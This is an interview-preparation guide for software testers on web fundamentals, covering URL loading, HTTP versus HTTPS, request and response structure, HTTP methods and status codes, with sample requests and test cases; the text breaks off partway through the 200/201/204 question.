# Phase 1 - Web Fundamentals: Interview Questions & Answers

## Section 1: Client-Server Architecture & Web Basics

### Q1: Explain how the web works. What happens when you type a URL in the browser?

**Answer**:

When you type a URL like "www.google.com" and hit Enter, here's the detailed step-by-step process:

**Step 1: URL Parsing**
- Browser parses the URL to extract:
  - Protocol: https://
  - Domain: www.google.com
  - Port: 443 (default for HTTPS, 80 for HTTP)
  - Path: / (root)

**Step 2: DNS Lookup** (Domain Name System)
- Browser checks if IP address is in cache (browser cache → OS cache → router cache)
- If not cached, DNS query sent:
  - Browser asks DNS resolver: "What's the IP of www.google.com?"
  - DNS resolver queries root servers → TLD servers (.com) → authoritative name servers
  - Returns IP address: e.g., 142.250.185.46
- Time: 20-120ms

**Step 3: TCP Connection** (3-Way Handshake)
- Browser initiates TCP connection to server's IP
- Three-step handshake:
  1. Client sends SYN (synchronize)
  2. Server responds with SYN-ACK (synchronize-acknowledge)
  3. Client sends ACK (acknowledge)
- Connection established
- Time: 50-200ms

**Step 4: TLS Handshake** (for HTTPS)
- Client and server negotiate encryption
- SSL/TLS certificate verified
- Encryption keys exchanged
- Secure connection established
- Time: 100-300ms

**Step 5: HTTP Request**
- Browser sends HTTP GET request:
  ```
  GET / HTTP/1.1
  Host: www.google.com
  User-Agent: Chrome/120.0
  Accept: text/html,application/xml
  Accept-Language: en-US
  Accept-Encoding: gzip, deflate
  Connection: keep-alive
  ```

**Step 6: Server Processing**
- Web server (Apache/Nginx) receives request
- Routes to application server if needed
- Application processes request:
  - Runs business logic
  - Queries database if needed
  - Generates response
- Time: 100-500ms

**Step 7: HTTP Response**
- Server sends response:
  ```
  HTTP/1.1 200 OK
  Content-Type: text/html; charset=UTF-8
  Content-Length: 12345
  Cache-Control: max-age=3600
  Set-Cookie: session_id=abc123; HttpOnly

  <!DOCTYPE html>
  <html>
  ...
  </html>
  ```

**Step 8: Browser Rendering**
- Browser receives HTML
- Parses HTML and builds DOM tree
- Discovers and requests additional resources:
  - CSS files
  - JavaScript files
  - Images
  - Fonts
- Constructs CSSOM (CSS Object Model)
- Executes JavaScript
- Renders page (paints pixels on screen)
- Time: 200-2000ms

**Step 9: Additional Resources**
- Browser makes parallel requests for CSS, JS, images
- Each follows similar request-response cycle
- Resources cached for future use

**Step 10: Page Interactive**
- DOM fully loaded
- JavaScript executed
- Page ready for user interaction

**Total Time Breakdown**:
- DNS Lookup: 20-120ms
- TCP Connection: 50-200ms
- TLS Handshake: 100-300ms
- HTTP Request/Response: 100-500ms
- Rendering: 200-2000ms
- **Total**: 0.5-4 seconds

**Why Important for Testers**:
- Understanding helps debug performance issues
- Identify bottlenecks (DNS, server, rendering)
- Test at each layer (network, server, client)
- Validate caching, cookies, sessions
- Verify security (HTTPS, certificates)

**Interview Tips**:
- Draw a diagram while explaining
- Mention specific timing at each step
- Relate to testing scenarios
- Example: "If page loads slowly, I'd check Network tab to see which step is slow"

---

### Q2: What is the difference between HTTP and HTTPS?

**Answer**:

| Aspect | HTTP | HTTPS |
|--------|------|-------|
| **Full Form** | HyperText Transfer Protocol | HTTP Secure |
| **Security** | Not secure, data sent in plain text | Secure, data encrypted |
| **Port** | 80 (default) | 443 (default) |
| **Protocol** | HTTP only | HTTP + SSL/TLS |
| **Certificate** | Not required | SSL/TLS certificate required |
| **Data Encryption** | No | Yes (encrypted in transit) |
| **URL** | http://example.com | https://example.com |
| **Browser Indicator** | No padlock | Padlock 🔒 icon |
| **Speed** | Slightly faster | Slightly slower (due to encryption) |
| **SEO** | Lower ranking | Higher ranking (Google prefers HTTPS) |
| **Cost** | Free | Certificate cost (or free with Let's Encrypt) |
| **Use Case** | Public information sites | Banking, e-commerce, login pages |

**How HTTPS Works**:

1. **Client Hello**: Browser requests secure connection
2. **Server Hello**: Server sends SSL certificate
3. **Certificate Verification**: Browser verifies certificate with Certificate Authority (CA)
4. **Key Exchange**: Browser and server generate session keys
5. **Secure Communication**: All data encrypted with session keys

**What Gets Encrypted**:
- ✅ URL path and query parameters
- ✅ Request/response headers
- ✅ Request/response body
- ✅ Cookies

**What Doesn't Get Encrypted**:
- ❌ Domain name (DNS lookup happens before encryption)
- ❌ IP address

**SSL/TLS Versions**:
- SSL 2.0 - Deprecated (insecure)
- SSL 3.0 - Deprecated (insecure)
- TLS 1.0 - Deprecated
- TLS 1.1 - Deprecated
- TLS 1.2 - Current standard
- TLS 1.3 - Latest (faster, more secure)

**Real-World Example**:

**HTTP** (Insecure):
```
# Someone monitoring network can see:
POST http://example.com/login
username=john@example.com
password=mypassword123

# Password visible in plain text! 🔓
```

**HTTPS** (Secure):
```
# Network monitor sees:
POST https://example.com/login
[encrypted data] 🔒

# Cannot read username, password, or any data
```

**Testing HTTPS**:

**Test Cases**:
1. ✅ Verify HTTPS enabled on all pages
2. ✅ Verify valid SSL certificate
3. ✅ Verify certificate not expired
4. ✅ Verify HTTP redirects to HTTPS
5. ✅ Verify no mixed content (HTTP resources on HTTPS page)
6. ✅ Verify secure cookies (Secure flag set)
7. ✅ Verify correct TLS version (1.2 or 1.3)

**How to Check in Browser**:
1. Click padlock icon in address bar
2. Click "Certificate" or "Connection is secure"
3. Verify:
   - Issued to: example.com
   - Issued by: Trusted CA
   - Valid from/to dates
   - Certificate chain

**Common SSL Errors**:
- "Your connection is not private" - Invalid/expired certificate
- "NET::ERR_CERT_DATE_INVALID" - Certificate expired
- "NET::ERR_CERT_AUTHORITY_INVALID" - Certificate from untrusted CA

**Interview Tip**: Always mention security importance, especially for applications handling sensitive data like banking, healthcare, e-commerce.

---

### Q3: Explain HTTP Request and Response structure.

**Answer**:

### HTTP Request Structure

**HTTP Request** consists of three parts:

```
[1. Request Line]
[2. Headers]
[3. Body (optional)]
```

#### 1. Request Line

```
POST /api/users HTTP/1.1
```

**Components**:
- **Method**: POST (GET, POST, PUT, DELETE, etc.)
- **URI**: /api/users (path to resource)
- **HTTP Version**: HTTP/1.1

#### 2. Request Headers

```
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 85
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Cookie: session_id=abc123; user_pref=dark_mode
Connection: keep-alive
Cache-Control: no-cache
```

**Key Headers Explained**:

| Header | Purpose | Example |
|--------|---------|---------|
| **Host** | Target server | example.com |
| **User-Agent** | Client information | Chrome/120.0 |
| **Accept** | Expected response format | application/json |
| **Content-Type** | Format of request body | application/json |
| **Content-Length** | Size of body in bytes | 85 |
| **Authorization** | Authentication credentials | Bearer token123 |
| **Cookie** | Cookies to send | session_id=abc123 |
| **Accept-Encoding** | Compression formats accepted | gzip, deflate |
| **Cache-Control** | Caching instructions | no-cache |
| **Referer** | Previous page URL | https://example.com/home |
| **Origin** | Request origin (CORS) | https://example.com |

#### 3. Request Body (for POST, PUT, PATCH)

**JSON Format**:
```json
{
  "name": "John Doe",
  "email": "john@example.com",
  "age": 25
}
```

**Form Data Format**:
```
username=johndoe&password=pass123&remember=true
```

**XML Format**:
```xml
<user>
  <name>John Doe</name>
  <email>john@example.com</email>
</user>
```

---

### HTTP Response Structure

**HTTP Response** consists of three parts:

```
[1. Status Line]
[2. Headers]
[3. Body]
```

#### 1. Status Line

```
HTTP/1.1 200 OK
```

**Components**:
- **HTTP Version**: HTTP/1.1
- **Status Code**: 200
- **Status Text**: OK

#### 2. Response Headers

```
Date: Mon, 27 Jan 2025 10:30:00 GMT
Server: Apache/2.4.41
Content-Type: application/json; charset=utf-8
Content-Length: 123
Connection: keep-alive
Set-Cookie: session_id=xyz789; Path=/; HttpOnly; Secure
Cache-Control: max-age=3600
ETag: "33a64df551425fcc55e4d42a148795d9f25f89d4"
Access-Control-Allow-Origin: https://example.com
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**Key Headers Explained**:

| Header | Purpose | Example |
|--------|---------|---------|
| **Date** | Response timestamp | Mon, 27 Jan 2025... |
| **Server** | Server software | Apache/2.4.41 |
| **Content-Type** | Response format | application/json |
| **Content-Length** | Response size in bytes | 123 |
| **Set-Cookie** | Set cookie in browser | session_id=xyz789 |
| **Cache-Control** | Caching instructions | max-age=3600 |
| **Location** | Redirect URL (for 3xx) | /new-page |
| **Access-Control-Allow-Origin** | CORS policy | * or specific origin |
| **X-Frame-Options** | Clickjacking protection | DENY, SAMEORIGIN |

#### 3. Response Body

**JSON Response**:
```json
{
  "id": 123,
  "name": "John Doe",
  "email": "john@example.com",
  "created_at": "2025-01-27T10:30:00Z"
}
```

**HTML Response**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Welcome</title>
</head>
<body>
    <h1>Hello, World!</h1>
</body>
</html>
```

**Error Response**:
```json
{
  "error": {
    "code": "INVALID_EMAIL",
    "message": "Email format is invalid",
    "field": "email"
  }
}
```

---

### Complete Example: Login Request/Response

**Request**:
```
POST /api/login HTTP/1.1
Host: example.com
User-Agent: Chrome/120.0
Content-Type: application/json
Content-Length: 62
Accept: application/json

{
  "email": "john@example.com",
  "password": "Pass@123"
}
```

**Success Response**:
```
HTTP/1.1 200 OK
Date: Mon, 27 Jan 2025 10:30:00 GMT
Content-Type: application/json
Set-Cookie: session_id=abc123xyz; Path=/; HttpOnly; Secure
Content-Length: 85

{
  "success": true,
  "user": {
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com"
  },
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Error Response**:
```
HTTP/1.1 401 Unauthorized
Date: Mon, 27 Jan 2025 10:30:00 GMT
Content-Type: application/json
Content-Length: 58

{
  "success": false,
  "error": "Invalid email or password"
}
```

---

### Testing Request/Response

**How to View in Browser**:
1. Open DevTools (F12)
2. Go to Network tab
3. Perform action (submit form, click button)
4. Click on request
5. View:
   - **Headers**: Request/response headers
   - **Payload**: Request body
   - **Preview**: Formatted response
   - **Response**: Raw response
   - **Cookies**: Cookies set/sent
   - **Timing**: Performance breakdown

**Testing Scenarios**:

**TC_001: Verify Request Headers**
- Verify Content-Type is correct
- Verify Authorization header present (if required)
- Verify User-Agent sent
- Verify Cookies sent

**TC_002: Verify Response Headers**
- Verify Content-Type matches data
- Verify Set-Cookie for session management
- Verify Cache-Control for caching
- Verify Security headers (X-Frame-Options, etc.)

**TC_003: Verify Response Body**
- Verify JSON structure matches schema
- Verify all required fields present
- Verify data types correct
- Verify values valid

**Interview Tip**: Mention that understanding request/response structure is crucial for API testing, debugging, and automation. Being able to read Network tab is essential for testers.

---

## Section 2: HTTP Methods & Status Codes

### Q4: Explain different HTTP methods with real-world examples.

**Answer**:

HTTP methods (also called HTTP verbs) specify the action to be performed on a resource.

### 1. GET Method

**Purpose**: Retrieve/read data from server (no modification)

**Characteristics**:
- ✅ Idempotent (multiple identical requests have same effect)
- ✅ Safe (doesn't modify server state)
- ✅ Cacheable
- ✅ Can be bookmarked
- ❌ No request body
- ❌ Parameters in URL (visible)
- ❌ Length limit (~2000 characters)

**Real-World Examples**:

**Example 1: Get User Profile**
```
GET /api/users/123 HTTP/1.1
Host: example.com
Authorization: Bearer token123
```

**Response**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 123,
  "name": "John Doe",
  "email": "john@example.com"
}
```

**Example 2: Search Products**
```
GET /api/products?category=electronics&price_max=1000&sort=price_asc HTTP/1.1
```

**Example 3: Pagination**
```
GET /api/posts?page=2&limit=10 HTTP/1.1
```

**When to Use**:
- Fetching list of items
- Getting item details
- Search queries
- Filtering and sorting
- Reading data

**Testing GET**:
```
Test Cases:
✅ Valid ID returns 200 with correct data
✅ Invalid ID returns 404
✅ Unauthorized access returns 401
✅ Pagination works correctly
✅ Filtering returns filtered results
✅ Sorting works as expected
✅ Response structure matches schema
```

---

### 2. POST Method

**Purpose**: Create new resource on server

**Characteristics**:
- ❌ Not idempotent (multiple calls create multiple resources)
- ❌ Not safe (modifies server state)
- ❌ Not cacheable
- ✅ Has request body
- ✅ Parameters in body (not visible in URL)
- ✅ No length limit

**Real-World Examples**:

**Example 1: User Registration**
```
POST /api/users HTTP/1.1
Host: example.com
Content-Type: application/json

{
  "name": "Jane Smith",
  "email": "jane@example.com",
  "password": "Pass@123"
}
```

**Response**:
```
HTTP/1.1 201 Created
Location: /api/users/124
Content-Type: application/json

{
  "id": 124,
  "name": "Jane Smith",
  "email": "jane@example.com",
  "created_at": "2025-01-27T10:30:00Z"
}
```

**Example 2: Create Order**
```
POST /api/orders HTTP/1.1
Authorization: Bearer token123
Content-Type: application/json

{
  "items": [
    {"product_id": 1, "quantity": 2},
    {"product_id": 5, "quantity": 1}
  ],
  "shipping_address": {...},
  "payment_method": "credit_card"
}
```

**Example 3: Login (Authentication)**
```
POST /api/login HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "pass123"
}
```

**When to Use**:
- Creating new resource (user, order, post)
- Uploading file
- Login/authentication
- Form submission
- Any action that creates data

**Testing POST**:
```
Test Cases:
✅ Valid data returns 201 Created
✅ Missing required field returns 400
✅ Invalid data format returns 400
✅ Duplicate creation returns 409 Conflict
✅ Unauthorized returns 401
✅ Verify resource created in database
✅ Verify Location header has new resource URL
✅ Verify response contains created resource with ID
```

---

### 3. PUT Method

**Purpose**: Update/replace entire resource

**Characteristics**:
- ✅ Idempotent (multiple identical requests have same effect)
- ❌ Not safe (modifies server state)
- ❌ Not cacheable
- ✅ Has request body
- ⚠️ Replaces entire resource

**Real-World Examples**:

**Example 1: Update User Profile (Entire)**
```
PUT /api/users/123 HTTP/1.1
Authorization: Bearer token123
Content-Type: application/json

{
  "id": 123,
  "name": "John Updated",
  "email": "john.new@example.com",
  "phone": "123-456-7890",
  "address": "123 Main St"
}
```

**Response**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 123,
  "name": "John Updated",
  "email": "john.new@example.com",
  "phone": "123-456-7890",
  "address": "123 Main St",
  "updated_at": "2025-01-27T10:35:00Z"
}
```

**Example 2: Replace Product Details**
```
PUT /api/products/456 HTTP/1.1
Authorization: Bearer token123
Content-Type: application/json

{
  "name": "New Product Name",
  "price": 99.99,
  "description": "Updated description",
  "category": "electronics",
  "stock": 50
}
```

**When to Use**:
- Updating entire resource
- Replacing all fields
- When you have complete data

**Testing PUT**:
```
Test Cases:
✅ Valid data returns 200 OK
✅ Non-existent ID returns 404
✅ Missing required fields returns 400
✅ Unauthorized returns 401
✅ Verify all fields updated in database
✅ Verify idempotency (same result on multiple calls)
✅ Verify unchanged fields not lost
```

---

### 4. PATCH Method

**Purpose**: Partial update (update specific fields only)

**Characteristics**:
- ⚠️ May or may not be idempotent
- ❌ Not safe (modifies server state)
- ❌ Not cacheable
- ✅ Has request body
- ✅ Updates only specified fields

**Real-World Examples**:

**Example 1: Update Only Email**
```
PATCH /api/users/123 HTTP/1.1
Authorization: Bearer token123
Content-Type: application/json

{
  "email": "newemail@example.com"
}
```

**Response**:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 123,
  "name": "John Doe",  ← unchanged
  "email": "newemail@example.com",  ← updated
  "phone": "123-456-7890",  ← unchanged
  "updated_at": "2025-01-27T10:40:00Z"
}
```

**Example 2: Update Product Stock**
```
PATCH /api/products/456 HTTP/1.1
Content-Type: application/json

{
  "stock": 45
}
```

**PUT vs PATCH Comparison**:

**Scenario**: User profile has: name, email, phone, address

**Using PUT** (must send all fields):
```
PUT /api/users/123
{
  "name": "John",
  "email": "newemail@example.com",  ← updating this
  "phone": "123-456-7890",  ← must include
  "address": "123 Main St"  ← must include
}
```

**Using PATCH** (send only what's changing):
```
PATCH /api/users/123
{
  "email": "newemail@example.com"  ← only this
}
```

**When to Use**:
- Updating specific fields
- When you don't have complete data
- More efficient than PUT

**Testing PATCH**:
```
Test Cases:
✅ Valid data returns 200 OK
✅ Only specified fields updated
✅ Other fields remain unchanged
✅ Invalid field name returns 400
✅ Non-existent ID returns 404
✅ Unauthorized returns 401
```

---

### 5. DELETE Method

**Purpose**: Delete resource from server

**Characteristics**:
- ✅ Idempotent (deleting already deleted resource same as first delete)
- ❌ Not safe (modifies server state)
- ❌ Not cacheable
- ❌ Usually no request body
- ⚠️ May return 200, 202, or 204

**Real-World Examples**:

**Example 1: Delete User**
```
DELETE /api/users/123 HTTP/1.1
Authorization: Bearer token123
```

**Response Option 1** (204 No Content):
```
HTTP/1.1 204 No Content
```

**Response Option 2** (200 with message):
```
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "message": "User deleted successfully"
}
```

**Example 2: Delete Product from Cart**
```
DELETE /api/cart/items/789 HTTP/1.1
Authorization: Bearer token123
```

**Example 3: Soft Delete (Mark as Deleted)**
```
DELETE /api/posts/456 HTTP/1.1
Authorization: Bearer token123

# Server marks as deleted but doesn't physically delete
# deleted_at field set to current timestamp
```

**When to Use**:
- Removing resource
- Removing item from cart
- Canceling order
- Deleting comment/post

**Testing DELETE**:
```
Test Cases:
✅ Valid ID returns 200/204
✅ Resource removed from database
✅ Non-existent ID returns 404
✅ Unauthorized returns 401
✅ Forbidden (can't delete others' resources) returns 403
✅ Deleting already deleted returns 404 (or 204 if idempotent)
✅ Verify cascade deletes (related data also deleted if required)
✅ GET on deleted resource returns 404
```

---

### 6. Other HTTP Methods (Less Common)

**HEAD**: Same as GET but only returns headers (no body)
```
HEAD /api/users/123 HTTP/1.1
# Use: Check if resource exists without downloading it
```

**OPTIONS**: Get supported HTTP methods for a resource
```
OPTIONS /api/users HTTP/1.1

Response:
Allow: GET, POST, PUT, DELETE
# Use: CORS preflight requests
```

**TRACE**: Echo back received request (debugging)
```
TRACE /api/users HTTP/1.1
# Use: Rarely used, often disabled for security
```

---

### Method Comparison Table

| Method | Purpose | Idempotent | Safe | Cacheable | Has Body |
|--------|---------|------------|------|-----------|----------|
| GET | Read | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No |
| POST | Create | ❌ No | ❌ No | ❌ No | ✅ Yes |
| PUT | Replace | ✅ Yes | ❌ No | ❌ No | ✅ Yes |
| PATCH | Update | ⚠️ Maybe | ❌ No | ❌ No | ✅ Yes |
| DELETE | Remove | ✅ Yes | ❌ No | ❌ No | ❌ No |
| HEAD | Headers only | ✅ Yes | ✅ Yes | ✅ Yes | ❌ No |
| OPTIONS | Methods | ✅ Yes | ✅ Yes | ❌ No | ❌ No |

---

### REST API CRUD Mapping

| Operation | HTTP Method | Example |
|-----------|-------------|---------|
| **Create** | POST | POST /api/users |
| **Read (all)** | GET | GET /api/users |
| **Read (one)** | GET | GET /api/users/123 |
| **Update (full)** | PUT | PUT /api/users/123 |
| **Update (partial)** | PATCH | PATCH /api/users/123 |
| **Delete** | DELETE | DELETE /api/users/123 |

---

### Real-World Testing Example: E-commerce API

**Test Suite for Products API**:

```
1. GET /api/products
   ✅ Returns list of products
   ✅ Supports pagination
   ✅ Supports filtering
   ✅ Returns 200 OK

2. GET /api/products/123
   ✅ Returns product details
   ✅ Returns 200 OK
   ✅ Invalid ID returns 404

3. POST /api/products
   ✅ Creates new product (admin only)
   ✅ Returns 201 Created
   ✅ Missing field returns 400
   ✅ Unauthorized returns 401

4. PUT /api/products/123
   ✅ Updates entire product
   ✅ Returns 200 OK
   ✅ Must include all fields

5. PATCH /api/products/123
   ✅ Updates specific fields
   ✅ Returns 200 OK
   ✅ Other fields unchanged

6. DELETE /api/products/123
   ✅ Deletes product
   ✅ Returns 204 No Content
   ✅ Product not accessible after deletion
```

**Interview Tip**: Always provide real-world examples. Explain not just what each method does, but when and why you'd use it. Mention idempotency and safety, as these are important in APIs.

---

### Q5: Explain common HTTP status codes with examples.

**Answer**:

HTTP status codes are grouped into 5 categories, each indicating different types of responses.

---

**1xx - Informational (Rarely Used)**:

**100 Continue**:
```
Client sent partial request, server says "continue sending rest"
Rarely seen in testing
```

**101 Switching Protocols**:
```
Server switching from HTTP to WebSocket
Example: Real-time chat applications
```

---

**2xx - Success**:

**200 OK** - Most common success response
```
Request: GET /api/users/123
Response: 200 OK + User data

Use: Successful GET, PUT, PATCH requests
```

**201 Created** - Resource successfully created
```
Request: POST /api/users (create new user)
Response: 201 Created
Headers: Location: /api/users/124
Body: {new user data}

Use: POST requests that create resources
```

**202 Accepted** - Request accepted, processing not complete
```
Request: POST /api/reports/generate (long-running)
Response: 202 Accepted
Body: {"status": "processing", "check_url": "/api/reports/123"}

Use: Asynchronous operations
```

**204 No Content** - Success but no data to return
```
Request: DELETE /api/users/123
Response: 204 No Content (empty body)

Use: DELETE requests, updates with no return data
```

---

**3xx - Redirection**:

**301 Moved Permanently** - Resource permanently moved
```
Request: GET http://example.com
Response: 301 Moved Permanently
Location: https://example.com (HTTP → HTTPS)

Browser automatically follows to new URL
Use: Domain changes, HTTP to HTTPS migration
```

**302 Found (Temporary Redirect)**:
```
Request: GET /old-page
Response: 302 Found
Location: /new-page

Use: Temporary redirects, A/B testing
```

**304 Not Modified** - Cached version still valid
```
Request: GET /image.jpg
Headers: If-Modified-Since: Jan 15, 2025
Response: 304 Not Modified (no body sent)

Browser uses cached version
Use: Optimizing bandwidth, faster page loads
```

**307 Temporary Redirect** - Same as 302 but maintains HTTP method
```
POST request remains POST after redirect
(302 might change POST to GET)
```

**308 Permanent Redirect** - Same as 301 but maintains HTTP method

---

**4xx - Client Errors**:

**400 Bad Request** - Invalid request syntax
```
Request: POST /api/users
Body: {"email": "invalidemail"} (missing required fields)
Response: 400 Bad Request
Body: {"error": "Missing required field: name"}

Use: Validation errors, malformed JSON
```

**401 Unauthorized** - Authentication required
```
Request: GET /api/users/me (without auth token)
Response: 401 Unauthorized
Headers: WWW-Authenticate: Bearer
Body: {"error": "Authentication required"}

Use: Missing or invalid credentials
```

**403 Forbidden** - Authenticated but not authorized
```
Request: DELETE /api/users/456 (trying to delete another user)
Headers: Authorization: Bearer <token>
Response: 403 Forbidden
Body: {"error": "You don't have permission"}

Use: Insufficient permissions
```

**404 Not Found** - Resource doesn't exist
```
Request: GET /api/users/999999
Response: 404 Not Found
Body: {"error": "User not found"}

Use: Invalid IDs, deleted resources, wrong URLs
```

**405 Method Not Allowed** - HTTP method not supported
```
Request: POST /api/users/123 (should be PUT)
Response: 405 Method Not Allowed
Headers: Allow: GET, PUT, DELETE
Body: {"error": "POST not allowed on this endpoint"}

Use: Wrong HTTP method used
```

**409 Conflict** - Request conflicts with current state
```
Request: POST /api/users
Body: {"email": "existing@example.com"}
Response: 409 Conflict
Body: {"error": "Email already registered"}

Use: Duplicate entries, concurrent modifications
```

**422 Unprocessable Entity** - Validation failed
```
Request: POST /api/users
Body: {"email": "not-an-email", "age": -5}
Response: 422 Unprocessable Entity
Body: {
  "errors": [
    {"field": "email", "message": "Invalid email format"},
    {"field": "age", "message": "Age must be positive"}
  ]
}

Use: Detailed validation errors
```

**429 Too Many Requests** - Rate limit exceeded
```
Request: GET /api/data (101st request in 1 minute)
Response: 429 Too Many Requests
Headers: Retry-After: 60
Body: {"error": "Rate limit: 100 requests/minute"}

Use: API rate limiting
```

---

**5xx - Server Errors**:

**500 Internal Server Error** - Generic server error
```
Request: GET /api/users
Response: 500 Internal Server Error
Body: {"error": "Something went wrong"}

Cause: Unhandled exception, database error, code bug
Use: When server crashes unexpectedly
```

**502 Bad Gateway** - Invalid response from upstream server
```
Request: GET /api/users
Response: 502 Bad Gateway

Cause: Backend server down, proxy can't connect
Use: Microservices communication failures
```

**503 Service Unavailable** - Server temporarily unavailable
```
Request: GET /api/users
Response: 503 Service Unavailable
Headers: Retry-After: 300
Body: {"error": "Maintenance in progress"}

Cause: Maintenance, overload, deployment
Use: Planned downtime
```

**504 Gateway Timeout** - Upstream server timeout
```
Request: GET /api/reports (takes > 30 seconds)
Response: 504 Gateway Timeout

Cause: Slow database query, network issues
Use: Long-running operations timeout
```

---

**Testing Scenarios**:

**Test Case Matrix**:

| Scenario | Expected Status | Test |
|----------|-----------------|------|
| Valid GET request | 200 | ✅ Data returned |
| Create new resource | 201 | ✅ Location header present |
| Delete resource | 204 | ✅ Empty body |
| Request without auth | 401 | ✅ Error message |
| Insufficient permissions | 403 | ✅ Forbidden message |
| Non-existent resource | 404 | ✅ Not found |
| Invalid data format | 400 | ✅ Validation error |
| Duplicate entry | 409 | ✅ Conflict message |
| Server error | 500 | ✅ Error logged |

---

**Interview Tips**:

**Tricky Question**: "What's the difference between 400 and 422?"
**Answer**:
- **400**: Generic "bad request" - malformed JSON, syntax error
- **422**: Specific validation errors - valid JSON but business logic fails
- **Example**:
  - 400: `{"name": "John"` (invalid JSON)
  - 422: `{"name": "John", "age": -5}` (age validation failed)

---

### Q6: What is the difference between 401 Unauthorized and 403 Forbidden?

**Answer**:

Both indicate access denied, but for different reasons.

---

**401 Unauthorized**:

**Meaning**: Authentication required or failed
- "Who are you?" → "I don't know you"
- User needs to login/provide credentials

**Common Causes**:
```
❌ No auth token provided
❌ Expired auth token
❌ Invalid credentials
❌ Token revoked/logged out
```

**Example**:
```
Request: GET /api/profile
Headers: (no Authorization header)

Response: 401 Unauthorized
Headers: WWW-Authenticate: Bearer realm="MyApp"
Body: {
  "error": "Authentication required",
  "message": "Please provide valid credentials"
}
```

**User Action**: Login, refresh token, provide credentials

---

**403 Forbidden**:

**Meaning**: Authenticated but not authorized
- "I know who you are, but you're not allowed"
- User logged in but lacks permissions

**Common Causes**:
```
❌ Insufficient role (user trying admin action)
❌ Account suspended
❌ Resource belongs to another user
❌ IP blocked
❌ Account expired
```

**Example**:
```
Request: DELETE /api/users/456 (trying to delete another user)
Headers: Authorization: Bearer <valid_token>

Response: 403 Forbidden
Body: {
  "error": "Forbidden",
  "message": "You don't have permission to delete this user"
}
```

**User Action**: Contact admin, upgrade account, request permissions

---

**Comparison Table**:

| Aspect | 401 Unauthorized | 403 Forbidden |
|--------|------------------|---------------|
| **Meaning** | Not authenticated | Not authorized |
| **Question** | "Who are you?" | "Can you do this?" |
| **User Status** | Unknown / Not logged in | Known / Logged in |
| **Has Credentials?** | ❌ No / Invalid | ✅ Yes / Valid |
| **Can Retry?** | ✅ Yes (after login) | ❌ No (need permission) |
| **Header** | WWW-Authenticate | None typically |
| **Fix** | Provide credentials | Get permissions |
| **Example** | Access /admin without login | Regular user accessing /admin |

---

**Real-World Scenarios**:

**Scenario 1: API Access**
```
Situation: Access protected API endpoint

401: No API key provided
Fix: Include API key in request

403: API key valid but doesn't have access to this endpoint
Fix: Upgrade API plan or request access
```

**Scenario 2: File Access**
```
401: Trying to download private file without login
Fix: Login first

403: Logged in but file belongs to another user
Fix: Request file owner to share
```

**Scenario 3: Admin Panel**
```
401: Access /admin without being logged in
Fix: Login with admin account

403: Logged in as regular user, trying to access /admin
Fix: Need admin role assigned
```

---

**Testing Both**:

**Test 401 Scenarios**:
```
TC_001: API call without auth token → 401
TC_002: API call with expired token → 401
TC_003: API call with invalid token → 401
TC_004: Login with wrong password → 401
```

**Test 403 Scenarios**:
```
TC_005: Regular user accessing admin endpoint → 403
TC_006: User A deleting User B's data → 403
TC_007: Suspended account trying to login → 403
TC_008: Free user accessing premium feature → 403
```

---

**Common Mistake**:

Many APIs incorrectly return:
- ❌ 403 when should be 401 (no authentication provided)
- ❌ 401 when should be 403 (authenticated but lacking permission)

**Correct Usage**:
```
No token → 401 (authenticate first)
Valid token, wrong permission → 403 (you're not allowed)
```

---

**Interview Tips**:

**Mnemonic**:
- **401**: Authentication (Who are you? - **401** = "4-oh-won't tell you who I am")
- **403**: Authorization (Four-bidden - you're **forbidden**)

**Remember**: Authentication comes before Authorization
1. First identify (401)
2. Then authorize (403)

---

### Q7: When to use 200 vs 201 vs 204?

**Answer**:

All three indicate success, but differ in what they convey.

---

**200 OK - General Success**:

**Use When**: Request succeeded, returning data

**Common Operations**:
- GET (retrieve data)
- PUT (update resource, return updated data)
- PATCH (partial update, return updated data)
- POST (when not creating, e.g., login, search)

**Examples**:

```
GET /api/users/123
Response: 200 OK
Body: {user data}

PUT /api/users/123
Response: 200 OK
Body: {updated user data}

POST /api/login
Response: 200 OK
Body: {token, user info}
```

---

**201 Created - Resource Created**:

**Use When**: New resource successfully created

**Common Operations**:
- POST (create new resource)

**Must Include**:
- `Location` header pointing to new resource
- Response body with created resource (optional but recommended)

**Examples**:

```
POST /api/users
Body: {"name": "John", "email": "john@example.com"}

Response: 201 Created
Headers:
  Location: /api/users/124
Body: {
  "id": 124,
  "name": "John",
  "email": "john@example.com",
  "created_at": "2025-01-27T10:30:00Z"
}
```

---

**204 No Content - Success, No Data**:

**Use When**: Request succeeded but no data to return

**Common Operations**:
- DELETE (resource deleted)
- PUT (update with no return data needed)
- PATCH (update with no return data)

**Characteristics**:
- **No response body** (must be empty)
- Client doesn't need confirmation data
- Saves bandwidth

**Examples**:

```
DELETE /api/users/123
Response: 204 No Content
(empty body)

PUT /api/users/123/preferences
Body: {"theme": "dark"}
Response: 204 No Content
(empty body - client doesn't need confirmation)
```

---

**Decision Tree**:

```
Is operation successful?
├── No → Use 4xx or 5xx
└── Yes ↓

Did it create a NEW resource?
├── Yes → 201 Created
│   └── Include Location header
└── No ↓

Do you need to return data in response?
├── Yes → 200 OK
│   └── Include response body
└── No → 204 No Content
    └── Empty body
```

---

**Comparison Table**:

| Code | Meaning | When | Body | Location Header |
|------|---------|------|------|-----------------|
| **200** | Success | GET, PUT, PATCH, POST | ✅ Yes | ❌ No |
| **201** | Created | POST (create) | ✅ Recommended | ✅ Required |
| **204** | Success, no content | DELETE, PUT, PATCH | ❌ No (empty) | ❌ No |

---

**Real API Examples**:

**Example 1: User API**

```
# Get user → 200
GET /api/users/123
200 OK + body

# Create user → 201
POST /api/users
